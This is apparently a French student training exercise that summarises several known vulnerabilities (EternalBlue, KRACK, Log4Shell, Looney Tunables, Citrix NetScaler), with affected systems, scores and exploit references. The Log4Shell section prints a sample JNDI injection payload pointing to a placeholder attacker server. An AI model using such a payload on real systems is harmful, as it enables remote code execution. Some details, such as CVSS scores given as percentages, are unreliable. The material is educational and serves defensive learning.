# Initiation à la classification des vulnérabilités

[Brief : 02-MESP-Initiation-Vuln](https://github.com/Aif4thah/Dojo-101/blob/main/Dojo-101-Apprentissage/02-MESP-Initiation-Vuln.md)

## Vulnérabilités

---

### 1. **Eternal - Blue** CVE-2017-0144

**Description :** Dans le serveur SMBv1 dans des différentes systèmes Windows (cité dans les éléments d’infrastructure concernés) Permet aux attaquants d'exécuter du code arbitraire avec des packets qui ont été modifié, connues comme ""Windows SMB Remote Code Execution Vulnerability."

**Éléments d'infrastructure concernés:**

  - Vista SP2
  - Windows Server 2008 SP2 and R2 SP1
  - Windows 7 SP1
  - Windows 8.1
  - Windows Server 2012 Gold and R2
  - Windows RT 8.1; and Windows 10 Gold, 1511, and 1607
  - Windows Server 2016

**Score base CVSS :**

  - Résultat : **0%** Car pas de serveur SBMv1 (Le score est calculé par rapport aux infrastructures internes de l’établissement où je develop mon activité).

**- Score EPSS :** à la date **2025-10-23** il est de **94.32%**

**- Exploit :**

  - Quelques references des exploit qui ont été publié:
    - exploit-db.com: 42030
    - exploit-db.com: 42031
    - exploit-db.com: 41891

### 2. **KRACK** - CVE-2017-13077 à 13082, 13084, 13086, 13087 et 13088

**Description :** C'est un attaque par rejeu sur le protocole WI-FI, découverte en 2016. Par une action repetitive pendant le handshake un attaquant finis pour avoir la keychain pour déchiffrer le traffic.

**Éléments d'infrastructure concernés:**

  - La plus par des platforms qui ont du WIFI
- Score base CVSS : **6.8%**
- Score EPSS : **0.77%**  (selon https://epsslookuptool.com/)

**Exploit :** L’exploitation de ces vulnérabilités peut entraîner le déchiffrement, la réutilisation de paquets (packet replay), le détournement de connexions TCP, l’injection de contenu HTTP, et d’autres conséquences. Par exemple : CVE-2017-13087 — réinstallation de la GTK lors du traitement d’une réponse WNM Sleep Mode (Wireless Network Management).

### 2. **log4shell** CVE-2021-44228

**Description :** C'était un Zero-day qui permettais d'executer de code Java arbitraire. Ce si involucre le service de logging Apache : Log4j (gère les traces et des historiques d'applications).
  
**Eléments d'infrastructure concernés:**
  - Des serveurs, ou ordinateurs qui ont les services concernés :
    - iCloud
    - L'édition Java de Minecraft
    - Steam
**Score base CVSS :** "L'Apache Software Foundation, dont Log4j est un projet, a attribué à Log4Shell une note CVSS de 10, la note la plus élevée possible"
**Score EPSS :** 94.36%

**Exploit :**

  - Peut être utilisée avec des charges utiles par exemple de la forme  `${jndi:ldap://serveur_pirate/message_malveillant} `
    - Génère des appels via le protocole LDAP ou DNS vers un serveur contrôle par un tiers.

### 3. **Looney-tenables** CVE-2023-4911

**Description :** C'est une vulnérabilité dans la libraire GNU-C, plus spécifiquement dans la variable d’environnement `GLIBC_TUNABLES` qui permet d'escalader les privileges jusqu'au root.

**Éléments d'infrastructure concernés:**
  - glibc 2.34 :
    -  INstallations par default de Fedora 37 and 38.
    -  Ubuntu 22.04 and 23.04
    -  Debian 12 and 13.
- Score EPSS : **78.36%**
- Exploit :
  - Avec un script, par exemple : https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
  

### 4. **Vulnérabilité dans Citrix NetScaler ADC et NetScaler Gateway** CVE-2025-7775 CVE-2025-7776 CVE-2025-8424 

**Description :** Permet une exécution de code arbitraire à distance et affecte toutes les versions de Citrix NetScaler ADC et NetScaler Gateway, dans certaines configurations détaillées par l'éditeur. La vulnérabilité est activement exploitée. https://www.cert.ssi.gouv.fr/alerte/CERTFR-2025-ALE-012/
- Versions concernés:
    - NetScaler ADC and NetScaler Gateway 14.1 BEFORE 14.1-47.48
    - NetScaler ADC and NetScaler Gateway 13.1 BEFORE 13.1-59.22
    - NetScaler ADC 13.1-FIPS and NDcPP BEFORE 13.1-37.241-FIPS and NDcPP
    - NetScaler ADC 12.1-FIPS and NDcPP BEFORE 12.1-55.330-FIPS and NDcPP

**Éléments d'infrastructure concernés:**
  - Dans mon environnement de travail en particulier, le service comptable utilise Citrix pour se connecter au logiciel SaaS de comptabilité Berger-Levrault. Ce service a changé d’application pour la connexion à distance afin de mitiger, je suppose, l’impact des potentielles vulnérabilités.
  
- CVSS v4.0 Base Score: 
    - CVE-2025-7775 : 9.2 %
    - CVE-2025-7776 : 8.8 %
    - CVE-2025-8424 : 8.7 %

- Exploits pour CVE-2025-7775 ont été observées.
  
Source du support Citrix : https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX694938
